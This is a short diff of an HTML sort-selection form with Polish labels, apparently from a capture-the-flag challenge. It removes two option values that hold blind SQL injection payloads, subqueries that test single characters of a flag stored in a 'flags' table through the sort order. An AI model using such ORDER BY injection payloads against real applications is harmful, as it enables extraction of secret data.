@@ -84,12 +84,6 @@
             <option value="id">Sortuj po ID</option>
             <option value="title">Sortuj po tytule</option>
             <option value="author">Sortuj po autorze</option>
-            <option value="(SELECT CASE WHEN substr((SELECT flag FROM flags),1,1)='f' THEN id ELSE author END)">
-                Secret sort #1
-            </option>
-            <option value="(SELECT CASE WHEN substr((SELECT flag FROM flags),2,1)='l' THEN id ELSE author END)">
-                Secret sort #2
-            </option>
         </select>
         <button type="submit">Sortuj</button>
     </form>
